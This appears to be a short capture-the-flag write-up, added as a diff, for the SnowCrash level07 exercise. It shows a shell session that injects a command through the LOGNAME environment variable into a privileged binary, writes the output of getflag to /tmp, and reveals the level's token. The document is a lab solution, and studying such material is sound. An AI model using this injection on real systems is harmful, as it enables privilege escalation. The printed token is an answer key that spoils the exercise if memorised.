@@ -1,0 +1,13 @@
+We decompile the file and we saw that there were using the LOGNAME env parametter.
+so we manage to pass a fonction to the logname.
+
+level07@SnowCrash:~$ export LOGNAME=$(getflag)
+level07@SnowCrash:~$ ./
+.bash_logout  .bashrc       level07       .profile
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token :
+sh: 2: Syntax error: ")" unexpected
+level07@SnowCrash:~$ export LOGNAME='$(getflag)>/tmp/flag07'
+level07@SnowCrash:~$ ./level07
+level07@SnowCrash:~$ cat /tmp/flag07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
